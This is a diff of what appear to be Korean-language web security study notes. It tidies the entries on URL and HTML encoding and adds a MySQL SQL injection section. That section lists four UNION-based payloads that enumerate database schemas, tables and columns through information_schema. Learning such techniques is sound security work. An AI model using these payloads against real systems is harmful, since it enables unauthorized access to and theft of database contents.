@@ -91,9 +91,18 @@ https://www.ssllabs.com/projects/documentation/index.html
 
 # web.xml 웹서버 설정 폴더 리스팅 / 파일쓰기 권한 등 
 
-# URL Encoding : URL에 사용할 수 있는 형태로 encoding
+# 보안관련 Encoding
 
-# HTML Encoding : 브라우저 렌더링 escape
+* URL Encoding : URL에 사용할 수 있는 형태로 encoding
+* HTML Encoding : 브라우저 렌더링 escape
+
+# MySQL SQL Injection
+
+    ' union select 1,2,3,4,5,6 #
+    ' union select schema_name,2,3,4,5,6 from information_schema.schemata#
+    ' union select table_name,2,3,4,5,6 from information_schema.tables where table_schema = database()#
+    ' union select group_concat(column_name),2,3,4,5,6 from information_schema.columns where table_name = '테이블명'#
+
 
 ----
 
